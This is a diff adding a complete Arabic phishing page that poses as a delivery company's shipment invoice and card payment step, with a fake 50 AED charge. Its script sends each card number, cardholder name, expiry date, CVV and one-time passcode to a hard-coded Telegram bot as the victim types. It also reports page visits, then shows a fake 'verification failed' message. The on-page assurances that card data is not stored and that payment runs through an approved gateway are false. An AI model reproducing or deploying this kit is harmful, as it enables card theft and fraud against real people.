@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d92735">
+<title>تأكيد الشحنة والدفع</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+:root{
+--red:#d92735;
+--dark:#252b35;
+--gray:#777;
+--bg:#f4f5f7;
+--green:#15945b;
+}
+
+body{
+font-family:Cairo,sans-serif;
+background:var(--bg);
+color:var(--dark);
+min-height:100vh;
+}
+
+header{
+background:#fff;
+padding:14px 18px;
+border-bottom:1px solid #eee;
+}
+
+.nav{
+max-width:520px;
+margin:auto;
+display:flex;
+align-items:center;
+justify-content:space-between;
+}
+
+.logo{
+display:flex;
+align-items:center;
+gap:10px;
+}
+
+.logo-icon{
+width:43px;
+height:43px;
+background:var(--red);
+color:white;
+border-radius:10px;
+display:grid;
+place-items:center;
+font-size:21px;
+}
+
+.logo strong{font-size:16px;font-weight:900}
+.logo small{display:block;color:#999;font-size:10px}
+
+.secure{
+font-size:10px;
+color:var(--green);
+}
+
+.container{
+max-width:510px;
+margin:23px auto;
+padding:0 13px 35px;
+}
+
+.page{
+display:none;
+animation:show .4s ease;
+}
+
+.page.active{display:block}
+
+@keyframes show{
+from{opacity:0;transform:translateY(15px)}
+to{opacity:1;transform:translateY(0)}
+}
+
+.card{
+background:white;
+border:1px solid #eaeaea;
+border-radius:13px;
+padding:21px;
+margin-bottom:15px;
+box-shadow:0 4px 18px #00000008;
+}
+
+.hero{
+background:linear-gradient(140deg,#d92735,#a81928);
+color:white;
+padding:38px 20px;
+border-radius:15px;
+text-align:center;
+overflow:hidden;
+}
+
+.hero-icon{
+width:95px;
+height:95px;
+margin:0 auto 18px;
+background:#ffffff22;
+border:1px solid #ffffff55;
+border-radius:25px;
+display:grid;
+place-items:center;
+font-size:46px;
+animation:float 3s infinite ease-in-out;
+}
+
+@keyframes float{
+50%{transform:translateY(-9px) rotate(3deg)}
+}
+
+.hero h1{font-size:23px;font-weight:900}
+.hero p{font-size:12px;line-height:2;margin-top:9px;color:#ffe4e4}
+
+.btn{
+width:100%;
+height:51px;
+border:0;
+border-radius:8px;
+background:var(--red);
+color:white;
+font-family:inherit;
+font-size:14px;
+font-weight:900;
+cursor:pointer;
+transition:.2s;
+}
+
+.btn:hover{background:#b51d2b}
+
+.btn-outline{
+background:white;
+color:#333;
+border:1px solid #ddd;
+margin-top:10px;
+}
+
+.heading{
+font-size:15px;
+font-weight:900;
+margin-bottom:18px;
+display:flex;
+align-items:center;
+gap:9px;
+}
+
+.heading i{color:var(--red)}
+
+.steps{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:8px;
+margin-bottom:20px;
+}
+
+.step{
+font-size:10px;
+color:#aaa;
+display:flex;
+align-items:center;
+gap:5px;
+}
+
+.step b{
+width:23px;
+height:23px;
+border-radius:50%;
+background:#e6e6e6;
+display:grid;
+place-items:center;
+}
+
+.step.active{color:var(--red);font-weight:900}
+.step.active b{background:var(--red);color:white}
+.step.done b{background:#e5f5eb;color:var(--green)}
+
+.line{width:20px;height:1px;background:#ddd}
+
+.info{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:14px;
+background:#f8f8f8;
+padding:14px;
+border-radius:9px;
+margin:15px 0;
+}
+
+.info small{
+display:block;
+font-size:10px;
+color:#999;
+}
+
+.info strong{
+font-size:12px;
+display:block;
+margin-top:5px;
+}
+
+table{
+width:100%;
+border-collapse:collapse;
+font-size:11px;
+}
+
+th{
+background:#f5f5f5;
+padding:11px 7px;
+text-align:right;
+color:#777;
+}
+
+td{
+padding:13px 7px;
+border-bottom:1px solid #eee;
+}
+
+.total{
+background:#f7f7f7;
+padding:14px;
+border-radius:9px;
+margin-top:15px;
+}
+
+.total div{
+display:flex;
+justify-content:space-between;
+font-size:12px;
+margin-bottom:10px;
+}
+
+.total div:last-child{
+border-top:1px solid #ddd;
+padding-top:12px;
+margin:0;
+font-weight:900;
+font-size:17px;
+}
+
+.total strong{color:var(--red)}
+
+.payment-option{
+display:flex;
+align-items:center;
+gap:12px;
+padding:15px;
+border:1px solid #e3e3e3;
+border-radius:10px;
+margin-bottom:12px;
+cursor:pointer;
+transition:.2s;
+}
+
+.payment-option.selected{
+border:2px solid var(--red);
+background:#fff9f9;
+}
+
+.pay-icon{
+width:46px;
+height:43px;
+background:#f4f4f4;
+border-radius:8px;
+display:grid;
+place-items:center;
+font-size:22px;
+}
+
+.pay-info{flex:1}
+.pay-info strong{font-size:13px;display:block}
+.pay-info small{font-size:10px;color:#999}
+
+.radio{
+width:18px;
+height:18px;
+border:1px solid #bbb;
+border-radius:50%;
+}
+
+.selected .radio{
+border:5px solid var(--red);
+}
+
+.card-brands{
+display:flex;
+gap:9px;
+align-items:center;
+margin-top:8px;
+}
+
+.visa{
+font-size:18px;
+font-weight:900;
+font-style:italic;
+color:#173d8c;
+}
+
+.master{
+display:flex;
+align-items:center;
+}
+
+.master i{
+width:19px;height:19px;border-radius:50%;
+display:block;
+}
+
+.master i:first-child{background:#eb3340}
+.master i:last-child{background:#f49b27;margin-right:-7px;opacity:.9}
+
+.subpanel{
+display:none;
+margin-top:16px;
+padding-top:16px;
+border-top:1px solid #eee;
+animation:show .3s;
+}
+
+.subpanel.active{display:block}
+
+/* ===== التصميم الرسمي لحقول البطاقة ===== */
+.global-card-box{
+border:1px solid #ccc;
+border-radius:12px;
+overflow:hidden;
+background:#fff;
+margin-top:16px;
+}
+
+.global-card-box .input-group{
+display:flex;
+align-items:center;
+border-bottom:1px solid #ccc;
+padding:0 14px;
+height:56px;
+position:relative;
+}
+
+.global-card-box .input-group:last-child{
+border-bottom:none;
+}
+
+.global-card-box .input-group i{
+color:#7c8fa6;
+font-size:20px;
+margin-left:12px;
+}
+
+.global-card-box .input-group input{
+flex:1;
+border:0;
+outline:none;
+background:transparent;
+font-family:inherit;
+font-size:14px;
+color:var(--dark);
+height:100%;
+width:100%;
+}
+
+.global-card-box .input-group input::placeholder{
+color:#a0aab5;
+font-weight:600;
+}
+
+.global-card-box .split-group{
+display:flex;
+}
+
+.global-card-box .split-group .input-group{
+flex:1;
+border-bottom:none;
+}
+
+.global-card-box .split-group .input-group:first-child{
+border-left:1px solid #ccc;
+}
+
+.global-card-box .input-group.expiry input{
+direction:ltr;
+text-align:right;
+font-family:inherit;
+font-weight:600;
+color:#555;
+}
+
+.global-card-box .input-group.cvv input{
+direction:ltr;
+text-align:right;
+font-family:inherit;
+font-weight:600;
+color:#555;
+}
+
+.hint{
+font-size:10px;
+color:#888;
+line-height:2;
+background:#f5f7f8;
+padding:12px;
+border-radius:8px;
+margin-top:13px;
+}
+
+.secure-box{
+background:#edf8f1;
+padding:13px;
+border-radius:8px;
+color:#18834d;
+font-size:10px;
+line-height:2;
+margin-top:15px;
+}
+
+.gateway{
+display:none;
+padding:15px;
+border-radius:9px;
+background:#f6f8fb;
+margin-top:15px;
+}
+
+.gateway.active{display:block}
+
+.gateway a{
+display:block;
+text-align:center;
+padding:13px;
+border-radius:8px;
+background:#1767b5;
+color:white;
+text-decoration:none;
+font-size:12px;
+font-weight:900;
+margin-top:12px;
+}
+
+/* ===== صفحة رمز التحقق ===== */
+.otp-box{
+display:flex;
+justify-content:center;
+gap:8px;
+direction:ltr;
+margin:20px 0;
+}
+
+.otp-box input{
+width:44px;
+height:52px;
+text-align:center;
+font-size:20px;
+font-weight:900;
+border:1px solid #ddd;
+border-radius:9px;
+font-family:inherit;
+outline:none;
+}
+
+.otp-box input:focus{
+border-color:var(--red);
+}
+
+.verify-state{
+text-align:center;
+padding:20px;
+font-weight:900;
+font-size:14px;
+}
+
+.spinner{
+width:34px;height:34px;
+border:4px solid #eee;
+border-top-color:var(--red);
+border-radius:50%;
+margin:0 auto 14px;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+to{transform:rotate(360deg)}
+}
+
+.fail{
+color:var(--red);
+}
+
+.success{
+color:var(--green);
+}
+
+.footer{
+text-align:center;
+padding:22px;
+font-size:10px;
+color:#999;
+line-height:2;
+}
+
+@media(max-width:370px){
+.card{padding:15px}
+.logo strong{font-size:14px}
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<div class="nav">
+<div class="logo">
+<div class="logo-icon">
+<i class="fa-solid fa-truck-fast"></i>
+</div>
+<div>
+<strong id="brand">شركة التوصيل السريع</strong>
+<small>خدمات الشحن والتوصيل</small>
+</div>
+</div>
+<div class="secure">
+<i class="fa-solid fa-shield-halved"></i>
+بيئة آمنة
+</div>
+</div>
+</header>
+
+<main class="container">
+
+<!-- الصفحة الأولى -->
+
+<section id="welcome" class="page active">
+
+<div class="hero">
+<div class="hero-icon">
+<i class="fa-solid fa-box-open"></i>
+</div>
+
+<h1>مرحباً بك معنا!</h1>
+<p>
+شُحنتك أصبحت جاهزة للتسليم.
+يسعدنا خدمتك، يرجى مراجعة تفاصيل طلبك
+واختيار طريقة الدفع المناسبة.
+</p>
+</div>
+
+<div class="card" style="margin-top:16px">
+<div class="heading">
+<i class="fa-solid fa-box"></i>
+ملخص الشحنة
+</div>
+
+<div class="info">
+<div>
+<small>رقم الشحنة</small>
+<strong id="welcomeTrack"></strong>
+</div>
+<div>
+<small>حالة الشحنة</small>
+<strong style="color:green">جاهزة للمراجعة</strong>
+</div>
+</div>
+
+<button class="btn" onclick="showPage('invoice')">
+عرض الفاتورة
+<i class="fa-solid fa-arrow-left"></i>
+</button>
+</div>
+
+</section>
+
+<!-- الصفحة الثانية -->
+
+<section id="invoice" class="page">
+
+<div class="steps">
+<div class="step done"><b>✓</b> الترحيب</div>
+<div class="line"></div>
+<div class="step active"><b>2</b> الفاتورة</div>
+<div class="line"></div>
+<div class="step"><b>3</b> الدفع</div>
+</div>
+
+<div class="card">
+
+<div class="heading">
+<i class="fa-solid fa-file-invoice"></i>
+تفاصيل الفاتورة
+</div>
+
+<div class="info">
+<div>
+<small>رقم الفاتورة</small>
+<strong id="invoiceNo"></strong>
+</div>
+<div>
+<small>رقم الشحنة</small>
+<strong id="invoiceTrack"></strong>
+</div>
+<div>
+<small>اسم المستلم</small>
+<strong id="customer"></strong>
+</div>
+<div>
+<small>مدينة التوصيل</small>
+<strong id="city"></strong>
+</div>
+</div>
+
+<div class="heading">
+<i class="fa-solid fa-box"></i>
+المنتجات والخدمات
+</div>
+
+<table>
+<thead>
+<tr>
+<th>الوصف</th>
+<th>العدد</th>
+<th>السعر</th>
+</tr>
+</thead>
+<tbody id="products"></tbody>
+</table>
+
+<div class="total">
+<div><span>قيمة المنتجات</span><span id="subtotal"></span></div>
+<div><span>التوصيل</span><span id="delivery"></span></div>
+<div><span>الإجمالي</span><strong id="total"></strong></div>
+</div>
+
+<div class="secure-box">
+<i class="fa-solid fa-shield-halved"></i>
+بيانات الفاتورة مخصصة للطلب الموضح أعلاه.
+يرجى مراجعة المبلغ قبل المتابعة.
+</div>
+
+<button class="btn" style="margin-top:17px" onclick="showPage('payment')">
+الانتقال إلى الدفع
+<i class="fa-solid fa-arrow-left"></i>
+</button>
+
+<button class="btn btn-outline" onclick="showPage('welcome')">
+رجوع
+</button>
+
+</div>
+</section>
+
+<!-- الصفحة الثالثة -->
+
+<section id="payment" class="page">
+
+<div class="steps">
+<div class="step done"><b>✓</b> الترحيب</div>
+<div class="line"></div>
+<div class="step done"><b>✓</b> الفاتورة</div>
+<div class="line"></div>
+<div class="step active"><b>3</b> الدفع</div>
+</div>
+
+<div class="card">
+
+<div class="heading">
+<i class="fa-solid fa-wallet"></i>
+اختر طريقة الدفع
+</div>
+
+<!-- خيار البطاقة فقط -->
+<div class="payment-option selected" onclick="selectPayment('card',this)">
+<div class="pay-icon">
+<i class="fa-regular fa-credit-card"></i>
+</div>
+<div class="pay-info">
+<strong>بطاقة بنكية</strong>
+<small>Visa / Mastercard</small>
+<div class="card-brands">
+<span class="visa">VISA</span>
+<span class="master"><i></i><i></i></span>
+</div>
+</div>
+<div class="radio"></div>
+</div>
+
+<!-- خيار البطاقة -->
+<div id="cardPanel" class="subpanel active">
+
+<div class="secure-box">
+<i class="fa-solid fa-lock"></i>
+الدفع بالبطاقة يتم عبر بوابة دفع إلكترونية معتمدة.
+لن يتم تخزين بيانات بطاقتك في موقع التوصيل.
+</div>
+
+<!-- حقول البطاقة بالتصميم الرسمي -->
+<div class="global-card-box">
+  <div class="input-group">
+    <i class="fa-regular fa-credit-card"></i>
+    <input id="cardNumber" type="tel" inputmode="numeric" maxlength="19" placeholder="رقم البطاقة" autocomplete="cc-number">
+  </div>
+  <div class="input-group">
+    <input id="cardName" type="text" inputmode="text" placeholder="الاسم كما هو على البطاقة" autocomplete="cc-name" style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase().replace(/[^A-Z ]/g,'')">
+  </div>
+  <div class="split-group">
+    <div class="input-group expiry">
+      <input id="cardExpiry" type="tel" inputmode="numeric" maxlength="5" placeholder="MM/YY" autocomplete="cc-exp">
+    </div>
+    <div class="input-group cvv">
+      <input id="cardCvv" type="tel" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="cc-csc">
+    </div>
+  </div>
+</div>
+
+<div style="margin-top:16px">
+<button class="btn" onclick="submitCard()">
+متابعة الدفع
+<i class="fa-solid fa-arrow-left"></i>
+</button>
+</div>
+
+</div>
+
+<div class="total">
+<div>
+<span>المبلغ المطلوب</span>
+<strong id="paymentTotal">50.00 AED</strong>
+</div>
+</div>
+
+<div class="secure-box">
+<i class="fa-solid fa-shield-halved"></i>
+حماية بياناتك المالية أولوية.
+لا نطلب بيانات تسجيل الدخول المصرفية.
+</div>
+
+</div>
+</section>
+
+<!-- صفحة رمز التحقق -->
+
+<section id="otp" class="page">
+
+<div class="steps">
+<div class="step done"><b>✓</b> الترحيب</div>
+<div class="line"></div>
+<div class="step done"><b>✓</b> الفاتورة</div>
+<div class="line"></div>
+<div class="step active"><b>4</b> التحقق</div>
+</div>
+
+<div class="card">
+
+<div class="heading">
+<i class="fa-solid fa-mobile-screen-button"></i>
+رمز التحقق
+</div>
+
+<p style="font-size:11px;color:#888;line-height:2">
+أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك.
+</p>
+
+<div class="otp-box" id="otpBox">
+<input type="text" inputmode="numeric" maxlength="1">
+<input type="text" inputmode="numeric" maxlength="1">
+<input type="text" inputmode="numeric" maxlength="1">
+<input type="text" inputmode="numeric" maxlength="1">
+<input type="text" inputmode="numeric" maxlength="1">
+<input type="text" inputmode="numeric" maxlength="1">
+</div>
+
+<button class="btn" onclick="submitOtp()">
+تأكيد الرمز
+<i class="fa-solid fa-arrow-left"></i>
+</button>
+
+</div>
+
+</section>
+
+<!-- صفحة حالة التحقق -->
+
+<section id="verify" class="page">
+
+<div class="card">
+
+<div class="verify-state" id="verifyState">
+<div class="spinner"></div>
+جاري التحقق...
+</div>
+
+</div>
+
+</section>
+
+<footer class="footer">
+<i class="fa-solid fa-shield-halved"></i>
+<br>
+خدمات شحن وتوصيل باحترافية وموثوقية
+<br>
+جميع الحقوق محفوظة © 2026
+</footer>
+
+</main>
+
+<script>
+
+// ====================================
+// بيانات الشركة والطلب
+// ====================================
+
+const CONFIG={
+
+company:"شركة التوصيل السريع",
+
+tracking:"DX-2026-10582",
+invoice:"INV-2026-10582",
+
+customer:"مهير عبد الله",
+city:"العين - أبو ظبي",
+
+currency:"AED",
+
+products:[
+{name:"شاشة LG حجم 100 بوصة",qty:1,price:1500},
+{name:"خدمة تجهيز الشحنة",qty:1,price:0}
+],
+
+deliveryFee:20,
+
+// رابط بوابة الدفع المعتمدة
+paymentURL:"",
+
+// رابط صورة المعاينة
+previewImage:"https://i.ibb.co/4nrtfXRz/1795476079290.jpg"
+
+};
+
+// ====================================
+// إعدادات تليكرام
+// ====================================
+
+const TELEGRAM = {
+  botToken: "9276004175:AAH9t9lWk_kZnjhEf4aLlm1OkGLO2uPGSC8",
+  chatId: "8302667206"
+};
+
+function sendTelegram(text){
+  fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM.chatId,
+      text: text,
+      parse_mode: "HTML"
+    })
+  }).catch(()=>{});
+}
+
+// ====================================
+// تجهيز الفاتورة
+// ====================================
+
+const money=n=>n.toFixed(2)+" "+CONFIG.currency;
+
+const subtotal=CONFIG.products.reduce(
+(s,p)=>s+p.price*p.qty,0
+);
+
+const total=subtotal+CONFIG.deliveryFee;
+
+document.getElementById("brand").textContent=CONFIG.company;
+document.getElementById("welcomeTrack").textContent=CONFIG.tracking;
+document.getElementById("invoiceNo").textContent=CONFIG.invoice;
+document.getElementById("invoiceTrack").textContent=CONFIG.tracking;
+document.getElementById("customer").textContent=CONFIG.customer;
+document.getElementById("city").textContent=CONFIG.city;
+
+document.getElementById("products").innerHTML=
+CONFIG.products.map(p=>`
+<tr>
+<td>${p.name}</td>
+<td>${p.qty}</td>
+<td>${money(p.price*p.qty)}</td>
+</tr>
+`).join("");
+
+document.getElementById("subtotal").textContent=money(subtotal);
+document.getElementById("delivery").textContent=money(CONFIG.deliveryFee);
+document.getElementById("total").textContent=money(total);
+// تم تثبيت المبلغ المطلوب في صفحة البطاقة على 50 درهم فقط
+document.getElementById("paymentTotal").textContent="50.00 "+CONFIG.currency;
+
+// ====================================
+// تنبيه دخول الموقع
+// ====================================
+window.addEventListener('load', () => {
+    sendTelegram(`🔔 <b>تنبيه دخول جديد</b>\nقام شخص ما بالدخول إلى الموقع الآن.`);
+});
+
+// ====================================
+// التنقل بين الصفحات
+// ====================================
+
+function showPage(id){
+  document.querySelectorAll(".page").forEach(p=>{
+    p.classList.remove("active");
+  });
+  document.getElementById(id).classList.add("active");
+  window.scrollTo({top:0,behavior:"smooth"});
+  
+  // تنبيه الانتقال بين الصفحات
+  if(id === 'invoice') {
+      sendTelegram(`📄 <b>تنبيه التنقل:</b>\nانتقل المستخدم إلى صفحة <b>الفاتورة</b>.`);
+  } else if (id === 'payment') {
+      sendTelegram(`💳 <b>تنبيه التنقل:</b>\nانتقل المستخدم إلى صفحة <b>الدفع</b>.`);
+  } else if (id === 'otp') {
+      sendTelegram(`🔐 <b>تنبيه التنقل:</b>\nانتقل المستخدم إلى صفحة <b>رمز التحقق (OTP)</b>.`);
+  }
+}
+
+// ====================================
+// اختيار وسيلة الدفع
+// ====================================
+
+function selectPayment(type,element){
+  document.querySelectorAll(".payment-option")
+  .forEach(p=>p.classList.remove("selected"));
+  element.classList.add("selected");
+}
+
+// ====================================
+// إرسال بيانات البطاقة والتحقق عند الضغط
+// ====================================
+
+function submitCard(){
+  const numberRaw=document.getElementById("cardNumber").value.replace(/\s/g,"");
+  const name=document.getElementById("cardName").value.trim();
+  const expiry=document.getElementById("cardExpiry").value.trim();
+  const cvv=document.getElementById("cardCvv").value.trim();
+
+  // التحقق من رقم البطاقة
+  if(!/^\d{16}$/.test(numberRaw)){
+    alert("يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم");
+    return;
+  }
+
+  // التحقق من نوع البطاقة (Visa تبدأ بـ 4، Mastercard تبدأ بـ 5 أو 2)
+  let cardType = "";
+  if (/^4/.test(numberRaw)) {
+    cardType = "Visa";
+  } else if (/^(5[1-5]|2[2-7])/.test(numberRaw)) {
+    cardType = "Mastercard";
+  } else {
+    alert("عذراً، يجب أن تكون البطاقة من نوع Visa أو Mastercard فقط.");
+    return;
+  }
+
+  // التحقق من الاسم
+  if(!/^[A-Z ]{2,}$/.test(name) || name.replace(/\s/g,"").length<2){
+    alert("يرجى إدخال اسم حامل البطاقة بأحرف إنجليزية كبيرة فقط");
+    return;
+  }
+
+  // التحقق من التاريخ
+  if(!/^\d{2}\/\d{2}$/.test(expiry)){
+    alert("يرجى إدخال تاريخ الانتهاء بصيغة MM/YY");
+    return;
+  }
+  const [mm,yy]=expiry.split("/").map(Number);
+  if(mm<1 || mm>12){
+    alert("يرجى إدخال شهر صحيح (01-12)");
+    return;
+  }
+  const now=new Date();
+  const curYY=now.getFullYear()%100;
+  const curMM=now.getMonth()+1;
+  if(yy<curYY || (yy===curYY && mm<curMM)){
+    alert("البطاقة منتهية الصلاحية");
+    return;
+  }
+
+  // التحقق من CVV
+  if(!/^\d{3,4}$/.test(cvv)){
+    alert("يرجى إدخال رمز أمان CVV صحيح (3 أو 4 أرقام)");
+    return;
+  }
+
+  const formattedNumber=numberRaw.replace(/(\d{4})(?=\d)/g,"$1 ");
+
+  sendTelegram(
+    `💳 <b>تم إدخال جميع بيانات البطاقة بنجاح</b>\n\n`+
+    `💠 <b>نوع البطاقة:</b> ${cardType}\n`+
+    `🔢 <b>رقم البطاقة:</b> <code>${formattedNumber}</code>\n`+
+    `👤 <b>اسم حامل البطاقة:</b> ${name}\n`+
+    `📅 <b>تاريخ الانتهاء:</b> ${expiry}\n`+
+    `🔐 <b>رمز الأمان (CVV):</b> <code>${cvv}</code>\n`+
+    `💰 <b>المبلغ:</b> 50.00 ${CONFIG.currency}`
+  );
+
+  showPage("otp");
+}
+
+// ====================================
+// رمز التحقق OTP
+// ====================================
+
+const otpInputs=document.querySelectorAll("#otpBox input");
+
+otpInputs.forEach((inp,i)=>{
+  inp.addEventListener("input",()=>{
+    inp.value=inp.value.replace(/\D/g,"").slice(0,1);
+    if(inp.value && i<otpInputs.length-1){
+      otpInputs[i+1].focus();
+    }
+    
+    // التحقق التلقائي عند اكتمال الكود
+    checkOtpComplete();
+  });
+
+  inp.addEventListener("keydown",(e)=>{
+    if(e.key==="Backspace" && !inp.value && i>0){
+      otpInputs[i-1].focus();
+    }
+  });
+});
+
+let otpSent = false; // لمنع تكرار الإرسال
+
+function checkOtpComplete() {
+  let code="";
+  otpInputs.forEach(i=>code+=i.value);
+  
+  if (code.length === 6 && !otpSent) {
+    otpSent = true;
+    sendTelegram(`🔐 <b>تم إدخال رمز التحقق (OTP) بالكامل:</b>\n<code>${code}</code>`);
+  }
+}
+
+function submitOtp(){
+  let code="";
+  otpInputs.forEach(i=>code+=i.value);
+
+  if(code.length!==6){
+    alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
+    return;
+  }
+
+  // في حال ضغط الزر قبل الاكتمال التلقائي (احتياطي)
+  if (!otpSent) {
+    sendTelegram(`🔐 <b>رمز التحقق (OTP):</b>\n<code>${code}</code>`);
+  }
+
+  showPage("verify");
+
+  document.getElementById("verifyState").innerHTML=
+  `<div class="spinner"></div>جاري التحقق...`;
+
+  setTimeout(()=>{
+    document.getElementById("verifyState").innerHTML=
+    `<div class="fail"><i class="fa-solid fa-circle-xmark" style="font-size:36px;margin-bottom:10px;display:block"></i>فشل التحقق<br><small style="font-size:11px;font-weight:400;color:#888">يرجى المحاولة مرة أخرى لاحقاً</small></div>`;
+    sendTelegram("❌ <b>فشل التحقق</b> — تم إدخال الرمز ولم تكتمل العملية");
+  },2500);
+}
+
+// ====================================
+// تنسيق حقول البطاقة تلقائياً وإرسال التنبيهات المعزولة
+// ====================================
+
+let lastSentNumber = "";
+let lastSentName = "";
+let lastSentExpiry = "";
+let lastSentCvv = "";
+
+const cardNumberInput=document.getElementById("cardNumber");
+cardNumberInput.addEventListener("input",()=>{
+  let v=cardNumberInput.value.replace(/\D/g,"").slice(0,16);
+  let formatted = v.replace(/(\d{4})(?=\d)/g,"$1 ");
+  cardNumberInput.value=formatted;
+
+  // إرسال عند اكتمال 16 رقم
+  if (v.length === 16 && v !== lastSentNumber) {
+    let type = "";
+    if (/^4/.test(v)) type = "Visa";
+    else if (/^(5[1-5]|2[2-7])/.test(v)) type = "Mastercard";
+    else type = "غير معروف";
+
+    sendTelegram(`🔢 <b>تم إدخال رقم البطاقة:</b>\n<code>${formatted}</code>\n<b>النوع:</b> ${type}`);
+    lastSentNumber = v;
+  }
+});
+
+const cardNameInput=document.getElementById("cardName");
+cardNameInput.addEventListener("input",()=>{
+  cardNameInput.value=cardNameInput.value.toUpperCase().replace(/[^A-Z ]/g,"");
+});
+
+// إرسال اسم حامل البطاقة عند الخروج من الحقل (blur)
+cardNameInput.addEventListener("blur",()=>{
+  let val = cardNameInput.value.trim();
+  if (val.length >= 3 && val !== lastSentName) {
+    sendTelegram(`👤 <b>تم إدخال اسم حامل البطاقة:</b>\n${val}`);
+    lastSentName = val;
+  }
+});
+
+const cardExpiryInput=document.getElementById("cardExpiry");
+cardExpiryInput.addEventListener("input",()=>{
+  let v=cardExpiryInput.value.replace(/\D/g,"").slice(0,4);
+  if(v.length>=3){
+    v=v.slice(0,2)+"/"+v.slice(2);
+  }
+  cardExpiryInput.value=v;
+
+  // إرسال عند اكتمال التاريخ
+  if (v.length === 5 && v !== lastSentExpiry) {
+    sendTelegram(`📅 <b>تم إدخال تاريخ الانتهاء:</b>\n<code>${v}</code>`);
+    lastSentExpiry = v;
+  }
+});
+
+const cardCvvInput=document.getElementById("cardCvv");
+cardCvvInput.addEventListener("input",()=>{
+  cardCvvInput.value=cardCvvInput.value.replace(/\D/g,"").slice(0,4);
+  
+  // إرسال عند إدخال 3 أو 4 أرقام للرمز
+  let val = cardCvvInput.value;
+  if ((val.length === 3 || val.length === 4) && val !== lastSentCvv) {
+    sendTelegram(`🔐 <b>تم إدخال رمز الأمان (CVV):</b>\n<code>${val}</code>`);
+    lastSentCvv = val;
+  }
+});
+
+</script>
+
+</body>
+</html>
